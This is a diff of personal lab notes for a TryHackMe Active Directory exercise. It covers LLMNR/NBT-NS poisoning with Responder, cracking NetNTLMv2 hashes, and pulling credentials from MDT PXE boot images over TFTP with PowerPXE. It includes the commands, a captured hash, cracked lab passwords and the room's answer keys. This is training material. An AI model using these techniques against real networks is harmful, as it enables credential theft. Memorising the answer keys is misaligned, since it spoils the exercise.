@@ -562,7 +562,7 @@ Anwswer: tryhackmeldappass1@
 
 
 
-## Task 4 Authentication Relays
+## Task 5 Authentication Relays
 
 NetNTLM Attacks via SMB, LLMNR/NBT‑NS Poisoning & Responder
 
@@ -609,10 +609,6 @@ It:
 - Hosts fake SMB/HTTP/SQL services
 - Forces the victim to authenticate
 - Captures NetNTLMv2 hashes
-
-### Q1 Task 4: What is the name of the tool we can use to poison and capture authentication requests on the network?
-
-Answer Q1 Task4: Responder
 
 On THM, you run:
 
@@ -717,9 +713,6 @@ $ sudo responder -I breachad
 [SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:84140fdd682af1f7:FD777C8FAF134B10880C00CE2B2F1B0E:0101000000000000800A76C009F7DC012470B1C35C5F54D10000000002000800420036004F004D0001001E00570049004E002D0045004F00550045004F004700440038004E003700360004003400570049004E002D0045004F00550045004F004700440038004E00370036002E00420036004F004D002E004C004F00430041004C0003001400420036004F004D002E004C004F00430041004C0005001400420036004F004D002E004C004F00430041004C0007000800800A76C009F7DC01060004000200000008003000300000000000000000000000002000008B10483D0820E576E7D40606685D7FC037F2E02C770833867BAD88BB851E87DD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E003100350030002E00370030002E00320032000000000000000000      
 ```
 
-### Q2 Task 4: What is the username associated with the challenge that was captured?
-
-Answer Q2 Task 4: svcFileCopy
 
 4. Cracking the Captured Hash
 
@@ -746,9 +739,6 @@ hashcat (v7.1.2) starting
 svcLDAP::za.tryhackme.com:43c996d16995092900000000000000000000000000000000:a9768495c34bddaf7966de3ae222963329c38ff5ba1012bc:63742039474d2ce1:tryhackmeldappass1@
 ...
 ```
-### Q3 Task 4: What is the value of the cracked password associated with the challenge that was captured? 
-
-Answer Q3 Task4: FPassword1!
 
 5. Relaying the Challenge
 Instead of cracking the hash, you can relay it to another SMB server.
@@ -763,8 +753,96 @@ Requirements:
 
 ✔ THM Questions (Answers)
 Question	Answer
-What tool is used to poison and capture authentication requests?	Responder
-What is the username associated with the captured challenge?	(You will find this in your Responder output — format: ZA\\username)
-What is the cracked password?	(You will get this after running Hashcat on your captured hash)
+### Q1 Task 5: What is the name of the tool we can use to poison and capture authentication requests on the network?
 
-Setting up slapd required some work: but in the end got 
+Answer Q1 Task 5: Responder
+
+### Q2 Task 5: What is the username associated with the challenge that was captured?
+
+Answer Q2 Task 5: svcFileCopy
+
+### Q3 Task 5: What is the value of the cracked password associated with the challenge that was captured? 
+
+Answer Q3 Task 5: FPassword1!
+
+
+
+
+## Task 6 Microsoft Deployment Toolkit
+
+1. Microsoft Deployment Toolkit (MDT)
+
+Used by large organizations to automate OS deployment.
+It integrates with SCCM for patch management and centralized updates.
+
+Purpose:
+
+- Deploy Windows images over the network.
+- Configure default software and updates automatically.
+- Simplify mass installations without physical media.
+
+2. PXE Boot Overview
+
+PXE (Preboot Execution Environment) allows a machine to boot from a network server instead of local storage.
+
+Simplified ASCII diagram of PXE boot flow:
+
+Code
++----------------+       +-----------+       +----------------+
+|   MDT Server   | <-->  |   User    | <-->  |  DHCP Server   |
++----------------+       +-----------+       +----------------+
+
+(1) DHCP Discover  -> Request IP + PXE info
+(2) DHCP Offer     -> Send IP + PXE info
+(3) DHCP Request   -> Accept IP
+(4) DHCP Ack       -> Confirm IP
+(5) Boot Discover  -> Client asks for PXE boot
+(6) PXE Info       -> Server sends boot details
+(7) TFTP Request   -> Client requests PXE boot image
+(8) TFTP Transfer  -> Server delivers PXE boot image
+
+3. PXE Boot Image Retrieval
+
+Attackers can exploit misconfigured MDT servers to extract credentials.
+
+Steps:
+
+- Identify MDT server IP (via DHCP or nslookup thmmdt.za.tryhackme.com).
+- Retrieve BCD file list from http://pxeboot.za.tryhackme.com.
+- Use TFTP to download the correct BCD file:
+
+```
+tftp -i <MDT_IP> GET "\Tmp\x64{GUID}.bcd" conf.bcd
+```
+Parse the BCD file using PowerPXE:
+```
+Get-WimFile -bcdFile conf.bcd
+```
+→ Reveals PXE Boot image location.
+
+Download the WIM image:
+```
+tftp -i <MDT_IP> GET "<PXE Boot Image Location>" pxeboot.wim
+```
+Extract credentials from the image:
+```
+Get-FindCredentials -WimFile pxeboot.wim
+```
+
+4. Recovered Credentials Example
+
+PowerPXE reveals credentials stored in bootstrap.ini:
+```
+DeployRoot = \\THMMDT\MTDBuildLab$
+UserID     = svcMDT
+UserDomain = ZA
+UserPassword = MDT@TryHackMe1
+```
+🧠 Key Answers
+Question	                                          Answer
+Tool used to create and host PXE Boot images	      Microsoft Deployment Toolkit
+Protocol used for file recovery from MDT server	   TFTP
+Username stored in PXE Boot image	               svcMDT
+Password stored in PXE Boot image	               MDT@TryHackMe1
+
+
